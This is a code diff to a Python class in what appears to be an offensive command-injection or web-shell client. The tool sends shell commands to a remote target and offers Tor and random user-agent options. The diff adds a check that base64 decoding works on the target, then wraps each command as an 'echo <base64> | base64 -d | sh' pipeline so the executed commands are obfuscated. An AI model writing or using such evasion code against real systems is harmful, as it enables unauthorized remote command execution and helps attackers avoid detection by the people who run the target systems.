@@ -40,7 +40,7 @@ class MakeRequest(object):
     Adding some commands to cmd requires updating
     self.info in TargetBox class 'target_info.py'
     '''
-    def __init__(self, url=None, method='get', parameter=None):
+    def __init__(self, url=None, method='get', parameter=None, shouldIuseB64=False):
         self.url = getargs.url
         self.method = getargs.method
         self.parameter = getargs.parameter
@@ -48,9 +48,16 @@ class MakeRequest(object):
         self.user_agent = getargs.agent
         self.random_agent = USER_AGENTS[randint(0, len(USER_AGENTS) - 1)]
         self.tor = getargs.tor
+        self.shouldIuseB64 = False
+
+        b64Useable = self.get_page_source("echo aGVsbG8gd29ybGQK | base64 -d")
+        if b64Useable and b64Useable[0] == 'hello world':
+            self.shouldIuseB64 = True
 
     def get_page_source(self, cmd):
         self.cmd = cmd
+        if self.shouldIuseB64:
+            self.cmd = "echo %s | base64 -d | sh" % self.cmd.encode('base64').replace('\n', '')
         result = re.search(';sudo ', self.cmd)
         if result:
             command = self.cmd.replace('sudo', '{0}sudo{1}'.format('\033[91m', '\033[93m'))
